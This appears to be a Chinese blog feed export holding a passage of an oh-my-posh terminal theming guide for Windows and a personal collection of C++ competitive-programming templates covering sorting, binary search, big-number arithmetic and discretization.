</blockquote>
<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><blockquote>
<p>官方文档：<a href="https://ohmyposh.dev/">https://ohmyposh.dev/</a></p>
</blockquote>
<p>现在的oh-my-posh可以直接从Microsoft Store下载exe文件安装了，别去折腾命令行的命令了，速度太慢了。<br>安装完成后，如果是windows系统，推荐Windows Terminal（没有的话在Microsoft Store里安装）下启动powershell,推荐在商店中下载安装<code>fluent terminal</code>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402252205681.png" alt="image-20240225214958894"></p>
<h2 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h2><p>配置oh-my-posh过程中比较复杂的点就是Nerd Font和Themes这两点：</p>
<h3 id="1-Nerd-Font"><a href="#1-Nerd-Font" class="headerlink" title="1.Nerd Font"></a>1.Nerd Font</h3><p>去下面的网站下载一个名字里面带NF的字体，windows下直接安装，其他系统参照网站说明。</p>
<blockquote>
<p>下载地址：<a href="https://www.nerdfonts.com/">https://www.nerdfonts.com/</a></p>
</blockquote>
<p>或者<a href="https://link.zhihu.com/?target=https://github.com/ryanoasis/nerd-fonts/releases/download/v2.1.0/Meslo.zip">点击下载</a>然后解压全选安装</p>
<h3 id="2-Themes"><a href="#2-Themes" class="headerlink" title="2.Themes"></a>2.Themes</h3><h4 id="step1：设置字体"><a href="#step1：设置字体" class="headerlink" title="step1：设置字体"></a>step1：设置字体</h4><p>用管理员身份打开Fluent Terminal，在界面中按下 ctrl+ shift+，后，会打开一个界面</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img//202402252205681.png" alt="image-20240225215041822"></p>
<p>选择终端,更改字体</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402252205721.png" alt="image-20240225215109949"></p>
<p>记得保存，新开一个窗口,看字体改变.</p>
<h4 id="step2-更改主题"><a href="#step2-更改主题" class="headerlink" title="step2:更改主题"></a>step2:更改主题</h4><h5 id="启动oh-my-posh"><a href="#启动oh-my-posh" class="headerlink" title="启动oh-my-posh"></a>启动oh-my-posh</h5><p>在Fluent Terminal中输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">notepad <span class="variable">$PROFILE</span></span><br></pre></td></tr></table></figure>

<p>第一次打开该脚本不存在,选择创建,在打开的文件中填入以下代码后保存：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">oh</span><span class="literal">-my-posh</span> init pwsh | <span class="built_in">Invoke-Expression</span> </span><br></pre></td></tr></table></figure>

<p>新开一个窗口,看脚本有无运行.</p>
<blockquote>
<p>若出现以下错误:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">无法加载文件C:\Users\xxx\Documents\WindowsPowerShell\profile.ps1，因为在此系统上禁止运行脚本</span><br></pre></td></tr></table></figure>

<p>解决方案：</p>
<p>win+x（或右键任务栏的Windows图标），选择以管理员身份运行powershell（Windows终端)&#x2F;Fluent Terminal，输入以下命令，重新打开终端即可成功执行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Set</span><span class="operator">-</span>ExecutionPolicy <span class="operator">-</span>ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h5><p>输入以下命令查看主题,会看到噼里啪啦一大堆主题样式都会蹦出来，选一个喜欢的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Get</span><span class="operator">-</span>PoshThemes</span><br></pre></td></tr></table></figure>

<p>最后会得到所有主题的路径</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402252205758.png" alt="image-20240225215638983"></p>
<p>复制路径,在这里比如我想使用<code>catppuccin</code>的主题,那么我就输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">notepad <span class="variable">$PROFILE</span></span><br></pre></td></tr></table></figure>

<p>然后更改命令为如下路径</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img//202402252205792.png" alt="image-20240225215821096"></p>
<p>新开一个窗口,观察主题有无发生改变,在这个过程中很可能会出现一些图标不显示，显示一半，或者各种方框乱码，那都是字体的问题，多重启windows Terminal几次，总会成功的。</p>
<h2 id="Good-Luck"><a href="#Good-Luck" class="headerlink" title="Good Luck"></a>Good Luck</h2><p>少折腾,好看,能用就行</p>
]]></content>
      <categories>
        <category>EATPOOP</category>
      </categories>
      <tags>
        <tag>fluent</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>板子</title>
    <url>/ACM/standardnotes/2023/10/24/</url>
    <content><![CDATA[<blockquote>
<p>十年 OI 一场空，不开 long long 见祖宗。</p>
</blockquote>
<h1 id="缺省源"><a href="#缺省源" class="headerlink" title="缺省源"></a>缺省源</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>,f=<span class="number">1</span>;<span class="type">char</span> ch=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))&#123;<span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) f=<span class="number">-1</span>;ch=<span class="built_in">getchar</span>();&#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))&#123;res=res*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>;ch=<span class="built_in">getchar</span>();&#125;</span><br><span class="line">    <span class="keyword">return</span> res*f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">write</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;<span class="number">0</span>)&#123;<span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>);x=-x;&#125;</span><br><span class="line">    <span class="keyword">if</span>(x&gt;<span class="number">9</span>) <span class="built_in">write</span>(x/<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(x%<span class="number">10</span>+<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="基础算法"><a href="#基础算法" class="headerlink" title="基础算法"></a>基础算法</h1><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//l=第一个存放的位置,r=最后一个存放的位置</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> a[], <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> x = a[(r+l)/<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> i = l<span class="number">-1</span>;</span><br><span class="line">	<span class="type">int</span> j = r+<span class="number">1</span> ;</span><br><span class="line">	<span class="keyword">if</span> (l &gt;= r)<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">while</span> (i &lt;j) &#123;</span><br><span class="line">		<span class="keyword">do</span> i++; <span class="keyword">while</span> (a[i] &lt; x);</span><br><span class="line">		<span class="keyword">do</span> j--; <span class="keyword">while</span> (a[j] &gt; x);<span class="comment">//一定要记住这个do while他和while 不一样，写while会死，直接咋-1死掉</span></span><br><span class="line">		<span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">			<span class="built_in">swap</span>(a[i], a[j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="built_in">quick_sort</span>(a, l, j);</span><br><span class="line">	<span class="built_in">quick_sort</span>(a, j+<span class="number">1</span>, r);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100000</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> q[N], tmp[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge_sort</span><span class="params">(<span class="type">int</span> q[], <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">	<span class="type">int</span> mid = l + r &gt;&gt;<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">merge_sort</span>(q, l, mid);</span><br><span class="line">	<span class="built_in">merge_sort</span>(q, mid+<span class="number">1</span>, r);</span><br><span class="line">	<span class="type">int</span> k = <span class="number">0</span>, i = l, j = mid+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>(i &lt;= mid &amp;&amp; j &lt;= r)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(q[i] &lt;= q[j]) tmp[k++] = q[i++];</span><br><span class="line">		<span class="keyword">else</span> tmp[k++] = q[j++];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(i &lt;= mid) tmp[k++] = q[i++];</span><br><span class="line">	<span class="keyword">while</span>(j &lt;= r) tmp[k++] = q[j++];</span><br><span class="line">	<span class="keyword">for</span>(i = l, j = <span class="number">0</span>; i &lt;= r; i++, j++) q[i] = tmp[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q[i]);</span><br><span class="line">	<span class="built_in">merge_sort</span>(q, <span class="number">0</span>, n<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;n ; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, q[i]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二分查找-整数二分"><a href="#二分查找-整数二分" class="headerlink" title="二分查找(整数二分)"></a>二分查找(整数二分)</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span>(a, a + n, <span class="built_in">less</span>&lt;<span class="type">int</span>&gt;());<span class="comment">//进行升序排序</span></span><br><span class="line"><span class="built_in">sort</span>(a, a + n, <span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());<span class="comment">//降序排序</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">-1</span>, j = n;<span class="comment">//这是重点,把起点放在数组外面</span></span><br><span class="line"><span class="keyword">if</span> (i + <span class="number">1</span> == j)&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot; false&quot;</span> &lt;&lt; endl; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;<span class="comment">//判断空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (k&lt;a[<span class="number">0</span>] || k&gt;a[n - <span class="number">1</span>]) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot; out&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//判断极端情况,k为flag</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (i+<span class="number">1</span>!=j) &#123;</span><br><span class="line">	<span class="type">int</span> x = (i + j) / <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (k &lt;= a[x])j = x;<span class="comment">//这些不等关系要依据条件,根据红区蓝区来分析</span></span><br><span class="line">	<span class="keyword">if</span> (k &gt; a[x])i = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不好使的话就用这个</span></span><br><span class="line"> <span class="type">int</span> l=<span class="number">1</span>,r=n;</span><br><span class="line">    <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">         <span class="type">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">         <span class="keyword">if</span>(<span class="built_in">sum</span>(mid)&gt;=k )r=mid;</span><br><span class="line">         <span class="keyword">else</span> l=mid+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="高精度"><a href="#高精度" class="headerlink" title="高精度"></a>高精度</h2><h3 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">add</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, vector&lt;<span class="type">int</span>&gt;&amp; B)</span> </span>&#123;<span class="comment">//加法模块</span></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;C;</span><br><span class="line">	<span class="keyword">if</span> (A.<span class="built_in">size</span>() &lt; B.<span class="built_in">size</span>())<span class="keyword">return</span> <span class="built_in">add</span>(B, A);</span><br><span class="line">	<span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t += A[i];</span><br><span class="line">		<span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) t += B[i];</span><br><span class="line">		C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">		t /= <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (t)C.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	string a, b;</span><br><span class="line">	cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;A, B;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">auto</span> C = <span class="built_in">add</span>(A, B);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)cout &lt;&lt; C[i];</span><br><span class="line">&#125;<span class="comment">//题目链接https://www.luogu.com.cn/problem/P1601</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="减法"><a href="#减法" class="headerlink" title="减法"></a>减法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, vector&lt;<span class="type">int</span>&gt;&amp; B)</span> </span>&#123;<span class="comment">//判断a是不是大于b，大于等于1，小于—1</span></span><br><span class="line">	<span class="keyword">if</span> (A.<span class="built_in">size</span>() !=B.<span class="built_in">size</span>())<span class="keyword">return</span> A.<span class="built_in">size</span>()&gt;B.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">			<span class="keyword">if</span> (A[i] != B[i])<span class="keyword">return</span> A[i] &gt; B[i];</span><br><span class="line">		&#125;<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;<span class="comment">//此模块判断a与b的大小，先从第一位开始判断，是bool类型</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sub</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; A, vector&lt;<span class="type">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, t = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() ; i++) &#123;</span><br><span class="line">		t = A[i] - t;</span><br><span class="line">		<span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>())t -= B[i];</span><br><span class="line">		C.<span class="built_in">push_back</span>((t + <span class="number">10</span>) % <span class="number">10</span>);</span><br><span class="line">		<span class="keyword">if</span> (t &lt; <span class="number">0</span>)t = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span>	t =<span class="number">0</span>;</span><br><span class="line">	&#125;<span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();<span class="comment">//注意这里的while</span></span><br><span class="line">	<span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	string a, b;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;A, B;</span><br><span class="line">	cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);<span class="comment">//注意因等于号导致的数组越界1问题</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);<span class="comment">//注意大小写a，一开始要读入a，这些错了是逻辑错误</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">cmp</span>(A, B)) &#123;</span><br><span class="line">		<span class="keyword">auto</span> C=<span class="built_in">sub</span>(A, B);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)cout &lt;&lt; C[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">auto</span> C = <span class="built_in">sub</span>(B, A);</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;-&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)cout &lt;&lt; C[i];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;<span class="built_in">mul</span>(vector&lt;<span class="type">int</span>&gt;&amp; A, <span class="type">int</span> b) &#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">	<span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || t; i++) &#123;<span class="comment">//t=0时也退出循环</span></span><br><span class="line">		<span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>())t += A[i] * b;</span><br><span class="line">		C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">		t /= <span class="number">10</span>;</span><br><span class="line">	&#125;<span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	string a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;A;</span><br><span class="line">	cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">auto</span> C = <span class="built_in">mul</span>(A,  b);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">		cout &lt;&lt; C[i];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;<span class="built_in">div</span>(vector&lt;<span class="type">int</span>&gt;&amp; A,  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> b) &#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">	   <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = A.<span class="built_in">size</span>()<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">       r = r * <span class="number">10</span> + A[i];</span><br><span class="line">	   C.<span class="built_in">push_back</span>(r / b);</span><br><span class="line">	   r %= b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">reverse</span>(C.<span class="built_in">begin</span>(), C.<span class="built_in">end</span>());</span><br><span class="line">	<span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line">	<span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> b;</span><br><span class="line">    string a;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;A;</span><br><span class="line">	cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">auto</span> C = <span class="built_in">div</span>(A, b);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">		cout &lt;&lt; C[i];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="离散化-适用于值域很大-数据量很小"><a href="#离散化-适用于值域很大-数据量很小" class="headerlink" title="离散化(适用于值域很大,数据量很小)"></a>离散化(适用于值域很大,数据量很小)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">typedef pair&lt;int ,int &gt; pii;</span><br><span class="line">vector&lt;int&gt; alls;</span><br><span class="line">vector&lt;pii&gt; add, query;</span><br><span class="line">const int N = 300010;</span><br><span class="line">int n, m;</span><br><span class="line">int a[N], s[N];//a[存放数组离散前的]s算前缀和</span><br><span class="line">int find(int x) &#123;</span><br><span class="line">	int l = -1; int r = alls.size();</span><br><span class="line">	while (l + 1 != r) &#123;//采用二分寻找答案,找到第一个大于等于x的位置</span><br><span class="line">		int mid = (r + l) &gt;&gt; 1;</span><br><span class="line">		if (alls[mid]&gt;=x)r = mid;</span><br><span class="line">		else l = mid;</span><br><span class="line">	&#125;return r + 1;//将x映射到1-alls.size,x表示位置</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	for (int i = 0; i &lt; n; i++) &#123;</span><br><span class="line">		int x, c;</span><br><span class="line">		cin &gt;&gt; x &gt;&gt; c;</span><br><span class="line">		alls.push_back(x);</span><br><span class="line">		add.push_back(&#123; x,c &#125;);//数据存入</span><br><span class="line">	&#125;</span><br><span class="line">	for (int i = 0; i &lt; m; i++) &#123;</span><br><span class="line">		int l, r;</span><br><span class="line">		cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">		query.push_back(&#123; l,r &#125;);</span><br><span class="line">		alls.push_back(l);</span><br><span class="line">		alls.push_back(r);//将数据分别存到三个数组当中</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	//去重</span><br><span class="line">	sort(alls.begin(), alls.end());//排序</span><br><span class="line">	alls.erase(unique(alls.begin(), alls.end()), alls.end());//去重，返回去重完alls的末尾位置,必须要先排序再去重</span><br><span class="line">	for (auto item : add) &#123;//对add中的每个元素进行迭代</span><br><span class="line">		int x = find(item.first);</span><br><span class="line">		a[x] += item.second;</span><br><span class="line">	&#125;</span><br><span class="line">	//预处理前缀和 </span><br><span class="line">	for (int i = 1; i &lt;= alls.size(); i++)s[i] = s[i - 1] + a[i];//位置寄托在alls中，数寄托在a【i】中</span><br><span class="line">	//处理询问</span><br><span class="line">	for (auto item : query) &#123;</span><br><span class="line">		int l = find(item.first), r = find(item.second);//将l和r在alls里面映射</span><br><span class="line">		cout &lt;&lt; s[r] - s[l - 1] &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

